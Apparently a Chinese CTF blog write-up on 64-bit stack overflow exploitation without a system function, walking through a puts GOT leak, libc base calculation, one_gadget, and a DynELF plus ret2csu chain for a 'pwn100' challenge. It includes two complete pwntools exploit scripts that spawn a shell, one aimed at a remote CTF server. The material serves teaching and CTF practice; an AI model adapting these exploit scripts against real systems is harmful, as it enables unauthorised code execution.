<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>pwn（无system函数下的栈溢出漏洞利用 | 【puts函数】 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="pwn（无system函数下的栈溢出漏洞利用 | 【puts函数】" />
<meta property="og:description" content="普通的64位程序的puts利用，如
可以看到是很明显的栈溢出利用，同时并没有后门
基本的利用思路是栈溢出后利用puts函数打印出任何函数的地址
然后返回main函数再次进行利用
具体利用是
leak
先用ROPgadget寻找gadget:pop rdi ret
（用于控制puts的参数）
然后第一次的payload: payload=‘a’*0x20&#43;‘b’*8&#43;p64(prdi_ret)&#43;p64(puts_GOT)&#43;p64(puts_plt)&#43;p
64(main)
利用 puts_plt 把 puts 函数的GOT表项打出来，然后回到main
第二次根据puts函数的地址和固定偏移计算出 libc 的加载地址，至于这些偏移 可以在脚本里面写symbols[‘puts’]也可以直接用gdb调试时 :p puts然后vmmap 查看基址，相减得到偏移
ret
得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面
的 /bin/sh 地址，调用 system 也行(个人推荐用one_gadget，方便很多)
第二次的payload: payload=‘a’*0x20&#43;‘b’*8&#43;p64(libc_base&#43;one_gadget_offset)
exp如下
from pwn import * binary = &#39;./pwn1&#39; #binary&#39;s name here context.binary = binary #context here context.log_level=&#39;debug&#39; pty = process.PTY p = process(binary, aslr = 1, stdin=pty, stdout=pty) #process option here &#39;&#39;&#39; Host = Port = p = remote(Host,Port) &#39;&#39;&#39; elf = ELF(binary) libc = elf." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/f6da8ef03b98fe88b3ce40f88e6a536d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-08-09T22:15:09+08:00" />
<meta property="article:modified_time" content="2019-08-09T22:15:09+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">pwn（无system函数下的栈溢出漏洞利用 | 【puts函数】</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>普通的64位程序的puts利用，如<br> <img src="https://images2.imgbox.com/28/76/ZAkczuuH_o.png" alt="在这里插入图片描述"><br> 可以看到是很明显的栈溢出利用，同时并没有后门<br> 基本的利用思路是栈溢出后利用puts函数打印出任何函数的地址<br> 然后返回main函数再次进行利用<br> 具体利用是</p> 
<p>leak<br> 先用ROPgadget寻找gadget:pop rdi ret<br> （用于控制puts的参数）<br> 然后第一次的payload: payload=‘a’*0x20+‘b’*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p<br> 64(main)<br> 利用 puts_plt 把 puts 函数的GOT表项打出来，然后回到main<br> 第二次根据puts函数的地址和固定偏移计算出 libc 的加载地址，至于这些偏移 可以在脚本里面写symbols[‘puts’]也可以直接用gdb调试时 :p puts然后vmmap 查看基址，相减得到偏移</p> 
<p>ret<br> 得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面<br> 的 /bin/sh 地址，调用 system 也行(个人推荐用one_gadget，方便很多)<br> 第二次的payload: payload=‘a’*0x20+‘b’*8+p64(libc_base+one_gadget_offset)<br> exp如下</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
binary <span class="token operator">=</span> <span class="token string">'./pwn1'</span> <span class="token comment">#binary's name here context.binary = binary #context here context.log_level='debug'</span>
pty <span class="token operator">=</span> process<span class="token punctuation">.</span>PTY
p <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> aslr <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>pty<span class="token punctuation">,</span> stdout<span class="token operator">=</span>pty<span class="token punctuation">)</span>
 <span class="token comment">#process option here</span>
<span class="token triple-quoted-string string">'''
Host =
Port =
p = remote(Host,Port) '''</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span> 
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
my_u64 <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> u64<span class="token punctuation">(</span>x<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
my_u32 <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> u32<span class="token punctuation">(</span>x<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#lambda表达式是快速定义函数的用法</span>
<span class="token comment">#u64()是字符串转int</span>
<span class="token comment">#ljust是将字符串以‘’来填充至多少位</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name\n'</span><span class="token punctuation">)</span> 
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span> 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'the key?\n'</span><span class="token punctuation">)</span>
prdi_ret<span class="token operator">=</span><span class="token number">0x4012ab</span>
puts_GOT<span class="token operator">=</span><span class="token number">0x404018</span>
puts_plt<span class="token operator">=</span><span class="token number">0x401030</span>
main<span class="token operator">=</span><span class="token number">0x401162</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>prdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_GOT<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts_offset<span class="token operator">=</span><span class="token number">0x6f690</span>
one_gadget_offset<span class="token operator">=</span><span class="token number">0x45216</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'fail!\n'</span><span class="token punctuation">)</span> 
libc_base<span class="token operator">=</span>my_u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>puts_offset 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'the key?\n'</span><span class="token punctuation">)</span> payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>one_gadget_offset<span class="token punctuation">)</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>另一个例题：<br> <a href="https://download.csdn.net/download/weixin_43742794/11505285">pwn100及exp</a><br> 首先用checksec看一下权限的情况<img src="https://images2.imgbox.com/66/d0/u2ghBo4U_o.png" alt="在这里插入图片描述"><br> 扔进ida64发现是一个栈溢出漏洞，但是并没有system函数和/bin/sh可以使用<br> 这里需要用到一个DynELF类<br> 具体细节可以参见这篇文章<br> https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;highlight=pwn<br> 核心思路是通过DynELF泄漏出system函数地址，然后再获得flag<br> 具体的需要利用pwngadget来寻找可以利用的汇编指令集</p> 
<pre><code>from pwn import*
context.log_level='debug'
 
start_addr=0x400550
pop_rdi=0x400763       
#pop rdi   retn
gadget1=0x40075a      
#pop rbx rbp r12 r13 r14 r15 retn
gadget2=0x0400740   
#mov rdx,r13  mov rsi,r14  mov edi,r15d  call word ptr [r12+rbx*8]
binsh_addr=0x60107c
 
io=remote('111.198.29.45',*****)
elf=ELF("./pwn100")
#当前目录下得有源文件

puts_addr = elf.plt['puts']
read_got = elf.got['read']
 
def leak(addr):
	count=0
	up=''
	content=''
	payload='a'*0x48
	payload+=p64(pop_rdi)
	payload+=p64(addr)
	payload+=p64(puts_addr)
	payload+=p64(start_addr)
	payload=payload.ljust(200,'a')
	#程序要求要输满200个才能继续执行下面的语句
	io.send(payload)
	io.recvuntil("bye~\n")
	while True:
	#无限循环读取，防止recv()读取输出不全
		c=io.recv(numb=1,timeout=0.1)
		#每次读取一个字节，设置超时时间确保没有遗漏
		count+=1
		if up == '\n' and c == "": 
		#上一个字符是回车且读不到其他字符，说明读完了
			content=content[:-1]+'\x00'
			#最后一个字符置为\x00
			#puts()的输出是不受控的，作为一个字符串输出函数，它默认把字符’\x00’作为字符串结尾
			break
		else:
			content+=c
			#拼接输出
			up=c
			#保存最后一个字符
	content=content[:4]
	#截取输出的一段作为返回值，提供给DynELF处理
        log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex')))
	return content
 #防报错模版，当利用puts泄露时使用
 
 
d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)

payload='a'*72
payload+=p64(gadget1)
payload+=p64(0)      			#	rbx=0  之后有一个call是[r12+rbx*8]
payload+=p64(1)      			#	rbp=1   有一个cmp判断
payload+=p64(read_got)	 		#	r12=read
payload+=p64(8)		           	#	r13=8    read size
payload+=p64(binsh_addr)	    #	r14=binsh_addr
payload+=p64(0)		            #   r15=0    r15 read 参数
payload+=p64(gadget2)
payload+='\x00'*56             
#一共要从栈中弹出这么多数据，6个pop，还把rsp加了8，6*8+8=56
payload+=p64(start_addr)
payload=payload.ljust(200,'a')
io.send(payload)

io.recvuntil('bye~\n')
io.send('/bin/sh\x00')
 
 
payload = "A"*0x48
payload += p64(pop_rdi)#system("/bin/sh\x00")	
payload += p64(binsh_addr)
payload += p64(system_addr)
payload = payload.ljust(200, "B")

io.send(payload)
io.interactive()

</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5d0c5e69e8b60f0660812ad83c5bee15/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">深度学习PyTorch（三）循环神经网络</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0f2bf0f5a79fbe47634928684fd51909/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Laravel5.6  多模块配置</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>